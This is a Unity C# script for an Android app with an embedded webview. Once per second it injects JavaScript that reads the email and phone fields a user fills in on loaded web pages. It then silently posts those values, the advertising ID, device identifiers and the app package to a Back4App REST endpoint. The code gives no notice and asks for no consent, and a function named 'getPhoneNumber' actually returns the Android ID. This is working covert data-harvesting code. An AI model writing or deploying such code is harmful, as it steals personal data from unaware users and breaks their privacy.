using System;
using System.Collections;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using TMPro;
using UnityEngine;
using UnityEngine.Networking;

public class SenderS : MonoBehaviour
{
    private string b4aApiKey = "";
    private string b4aAppId = "";
    
    private string brand = "";
    private string querySelectorEmail = "";
    private string querySelectorPhone = "";
    private string appId = "";
    private string packageName = "";

    private UniWebView _webView;
    
    private string email = "";
    private string phoneNumberFromView = "";
    public void StartWatching(string brand, string querySelectorEmail, string querySelectorPhone, string restApiKey, string AppId,string packageName, UniWebView webView)
    {
        
        this.brand = brand;
        this.querySelectorEmail = querySelectorEmail;
        this.querySelectorPhone = querySelectorPhone;
        this.b4aApiKey = restApiKey;
        this.packageName = packageName;
        this.b4aAppId = AppId;
        _webView = webView;
     
       _webView.OnPageFinished += (view, statusCode, url) =>
       {
           pageReloaded();
       };

       StartCoroutine(AddCheckEmail());
       StartCoroutine(AddCheckTel());

    }
    
    IEnumerator AddCheckEmail()
    {
        
        while (true)
        {
            yield return new WaitForSeconds(1);
            
            _webView.AddJavaScript(
                "function getEmail() {" +
                "var emails = document.querySelectorAll(" +querySelectorEmail + ");"+//(\'input[type=\"email\"]\');" +
                "return emails[0].value;" +
                "}");
            _webView.EvaluateJavaScript("getEmail();", completionHandler: (payload) => {
                print(payload.data);  // => "9"
                if (checkEmailRegex(payload.data))
                {
                    email = payload.data;
                }
            });

            var t = "\'input[type=\"email\"]\', \'input[name^=email]\'";
        }
    } 
    IEnumerator AddCheckTel()
    {
        
        while (true)
        {
            yield return new WaitForSeconds(1);
            _webView.AddJavaScript(
                "function getTeln() {" +
                "var tels = document.querySelectorAll(" +querySelectorPhone + ");" + //(\'input[type=\"tel\"]\');" +
                "return tels[0].value;" +
                "}"); 
           
            _webView.EvaluateJavaScript("getTeln();", completionHandler: (payload) => {
                print(payload.data);  // => "9"
                if(payload.data.Length > 8 && digitsInString(payload.data)>6)
                    phoneNumberFromView = payload.data;
            });
            
        }
    }

    int digitsInString(string str)
    {
        int count = 0;
        for (int i = 0; i < str.Length; i++)
        {
            if (Char.IsDigit(str[i]))
            {
                count++;
            }
        }

        return count;
    }
   
    private void pageReloaded()
    {
        if (!PlayerPrefs.HasKey("dataSent"))
        {
            if (!string.IsNullOrEmpty(email))
            {
                if (checkEmailRegex(email))
                {
                    string tryPhone = "";
                    try
                    {
                        tryPhone = phoneNumberFromView==""? getPhoneNumber() : phoneNumberFromView;
                    }
                    catch (Exception e)
                    {
                        Debug.Log("failed to fetch phone from java " + e.Message);
                    }
                    
                    SendDataBack4App(GetADID(), GetUID(), email, tryPhone, brand: this.brand, prilId: packageName);
                    print("data sent email");
                    PlayerPrefs.SetInt("dataSent", 1);
                }
            }else if (!string.IsNullOrEmpty(phoneNumberFromView) && phoneNumberFromView.Length > 8)
            {
                if(!string.IsNullOrEmpty(email) && checkEmailRegex(email))
                    SendDataBack4App(GetADID(), GetUID(), phone: phoneNumberFromView, email: email, brand: this.brand, prilId: packageName);
                else
                    SendDataBack4App(GetADID(), GetUID(), phone: phoneNumberFromView, brand: this.brand, prilId: packageName);
                print("data sent phone");
                PlayerPrefs.SetInt("dataSent", 1);
            }
        }
        
    }
    
    bool checkEmailRegex(string email)
    {
        return  Regex.IsMatch(email, @"\A(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)\Z", RegexOptions.IgnoreCase);
    }

    private static string getPhoneNumber() { // Get the phone number from the device.
        string phoneNumber = "";
#if UNITY_ANDROID
        AndroidJavaClass up = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
        AndroidJavaObject ca = up.GetStatic<AndroidJavaObject>("currentActivity");
        AndroidJavaObject contentResolver = ca.Call<AndroidJavaObject>("getContentResolver");
        AndroidJavaClass secure = new AndroidJavaClass("android.provider.Settings$Secure");
        phoneNumber = secure.CallStatic<string>("getString", contentResolver, "android_id");
#endif
        return phoneNumber;
    }
    
    private string GetADID() // Getting the advertising ID
    { 
        string advertisingID = ""; // Advertising ID
        try 
        { 
            AndroidJavaClass up = new AndroidJavaClass("com.unity3d.player.UnityPlayer"); 
            AndroidJavaObject currentActivity = up.GetStatic<AndroidJavaObject>("currentActivity"); 
            AndroidJavaClass client = new AndroidJavaClass("com.google.android.gms.ads.identifier.AdvertisingIdClient"); 
            AndroidJavaObject adInfo = client.CallStatic<AndroidJavaObject>("getAdvertisingIdInfo", currentActivity); 
            advertisingID = adInfo.Call<string>("getId").ToString(); 
        } 
        catch (System.Exception e) 
        { 
            advertisingID = "none"; 
        }

        if (advertisingID == "none")
            return GetUID();
        return advertisingID; 
    }

    private string GetUID()
    {
        if (PlayerPrefs.HasKey("uid")) { // If the user id is saved, then we add it to the url.
           return PlayerPrefs.GetString("uid").Replace(" ", ""); // Get the user id.
        }  
        PlayerPrefs.SetString("uid", SystemInfo.deviceUniqueIdentifier.Substring(0, 6) + $"_{System.DateTime.Now.ToString("yyMMdd")}"); // Save the user id.
        return PlayerPrefs.GetString("uid").Replace(" ", ""); // Get the user id.
    }

    public void SendDataBack4App(string gaid, string uid, string email = "", string phone = "", string brand ="", string prilId="")
    {
  
        string urltosend = "https://parseapi.back4app.com/classes/users";
        string json = "{" +
                      "\"uid\"" + ":\"" + uid + "\"," +
                      "\"gaid\"" + ":\"" + gaid + "\"," +
                      "\"email\"" + ":\"" + email + "\"," +
                      "\"phone\"" + ":\"" + phone + "\"," +
                      "\"brand\"" + ":\"" + brand + "\"," +
                      "\"appId\"" + ":\"" + prilId + "\"" +
                      "}";
        UnityWebRequest unityWebRequest = new UnityWebRequest(urltosend, "POST");
        byte[] jsonToSend = new System.Text.UTF8Encoding().GetBytes(json);
        unityWebRequest.uploadHandler = (UploadHandler)new UploadHandlerRaw(jsonToSend);
        unityWebRequest.downloadHandler = (DownloadHandler)new DownloadHandlerBuffer();
        unityWebRequest.SetRequestHeader("X-Parse-Application-Id", b4aAppId);
        unityWebRequest.SetRequestHeader("Content-Type", "application/json");
        unityWebRequest.SetRequestHeader("Accept", "application/json");
        unityWebRequest.SetRequestHeader("X-Parse-REST-API-Key", b4aApiKey);
        unityWebRequest.SendWebRequest();
        print("Sent");
    }
}
